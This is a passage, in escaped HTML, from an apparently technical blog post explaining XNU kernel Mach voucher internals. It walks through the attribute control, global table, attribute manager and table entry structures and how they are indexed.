&lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;struct&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ipc_voucher_attr_control &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;os_refcnt_t &amp;nbsp; ivac_refs&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;boolean_t &amp;nbsp; &amp;nbsp; ivac_is_growing&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* is the table being grown */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac_entry_t &amp;nbsp;ivac_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* table of voucher attr value entries */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;iv_index_t &amp;nbsp; &amp;nbsp;ivac_table_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* size of the attr value table */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;iv_index_t &amp;nbsp; &amp;nbsp;ivac_init_table_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* size of the attr value table */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;iv_index_t &amp;nbsp; &amp;nbsp;ivac_freelist&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* index of the first free element */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;ipc_port_t &amp;nbsp; &amp;nbsp;ivac_port&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* port for accessing the cache control &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;lck_spin_t &amp;nbsp; &amp;nbsp;ivac_lock_data&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;iv_index_t &amp;nbsp; &amp;nbsp;ivac_key_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* key index for this value */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;These are accessed indirectly via another global table:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.458710f747bcd533915a3238dbd017b636296741"&gt;&lt;/a&gt;&lt;a id="t.4"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;static&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ipc_voucher_global_table_element iv_global_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;];&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;(Again, the comments in the code indicate that in the future that this table may grow in size and allow attributes to be managed in userspace, but for now it&amp;#39;s just a fixed size array.)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;Each element in that table has this structure:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.f065f1b068e3aad8a11a5356fab0dbe3d10ab90a"&gt;&lt;/a&gt;&lt;a id="t.5"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;typedef&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;struct&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ipc_voucher_global_table_element &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_attr_manager_t &amp;nbsp; &amp;nbsp; &amp;nbsp;ivgte_manager&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_attr_control_t &amp;nbsp; &amp;nbsp; &amp;nbsp;ivgte_control&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_key_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivgte_key&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ipc_voucher_global_table_element&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Both the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_global_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;and each voucher&amp;#39;s &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;are indexed by &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;(key-1)&lt;/span&gt;&lt;span&gt;, not &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;key&lt;/span&gt;&lt;span&gt;, so the userdata entry is &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;[6]&lt;/span&gt;&lt;span&gt;, not &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;[7]&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;, even though the array still has 8 entries.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ipc_voucher_attr_control_t&lt;/span&gt;&lt;span&gt;&amp;nbsp;provides an abstract interface for managing &amp;quot;values&amp;quot; and the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ipc_voucher_attr_manager_t&lt;/span&gt;&lt;span&gt;&amp;nbsp;provides the &amp;quot;type-specific&amp;quot; logic to implement the semantics of each type (here by type I mean &amp;quot;key&amp;quot; or &amp;quot;attr&amp;quot; type.) Let&amp;#39;s look more concretely at what that means. Here&amp;#39;s the definition of &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ipc_voucher_attr_manager_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.467ea53fdb41a42817b67f1b1b14674c0e55d04b"&gt;&lt;/a&gt;&lt;a id="t.6"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;struct&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ipc_voucher_attr_manager &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; ipc_voucher_attr_manager_release_value_t &amp;nbsp; &amp;nbsp;ivam_release_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; ipc_voucher_attr_manager_get_value_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ivam_get_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; ipc_voucher_attr_manager_extract_content_t &amp;nbsp;ivam_extract_content&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; ipc_voucher_attr_manager_command_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ivam_command&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; ipc_voucher_attr_manager_release_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ivam_release&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; ipc_voucher_attr_manager_flags &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ivam_flags&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivam_flags&lt;/span&gt;&lt;span&gt;&amp;nbsp;is an &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;int&lt;/span&gt;&lt;span&gt;&amp;nbsp;containing some flags; the other five fields are function pointers which define the semantics of the particular attr type. Here&amp;#39;s the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ipc_voucher_attr_manager&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure for the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;type:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.24cf1225ae06e4faa7d9d726ded665d4facb053f"&gt;&lt;/a&gt;&lt;a id="t.7"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;const&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;struct&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ipc_voucher_attr_manager user_data_manager &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam_release_value &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp;user_data_release_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam_get_value &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;user_data_get_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam_extract_content &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;user_data_extract_content&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam_command &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;user_data_command&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam_release &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;user_data_release&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam_flags &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;IVAM_FLAGS_NONE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;Those five function pointers are the only interface from the generic voucher code into the type-specific code. The interface may seem simple but there are some tricky subtleties in there; we&amp;#39;ll get to that later!&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Let&amp;#39;s go back to the generic &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ipc_voucher_attr_control&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure which maintains the &amp;quot;values&amp;quot; for each key in a type-agnostic way. The most important field is &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac_entry_t &amp;nbsp;ivac_table&lt;/span&gt;&lt;span&gt;, which is &lt;/span&gt;&lt;span&gt;an array of &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac_entry_s&lt;/span&gt;&lt;span&gt;&amp;#39;s&lt;/span&gt;&lt;span&gt;. It&amp;#39;s an index into this table which is stored in each voucher&amp;#39;s &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;Here&amp;#39;s the structure of each entry in that table:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.777c9f9c4271dfb1023047f7a3639b98f2fed9d2"&gt;&lt;/a&gt;&lt;a id="t.8"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;struct&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivac_entry_s &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; iv_value_handle_t ivace_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; iv_value_refs_t &amp;nbsp; ivace_layered&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;:&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;1&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* layered effective entry */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_releasing&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;:&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;1&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* release in progress */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_free&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;:&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;1&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* on freelist */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_persist&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;:&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;1&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* Persist the entry, don&amp;#39;t&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;count made refs */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_refs&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;:&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;28&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* reference count */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;union&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; iv_value_refs_t ivaceu_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* made count (non-layered) */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp;ivaceu_layer&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* next effective layer&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; (layered) */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span 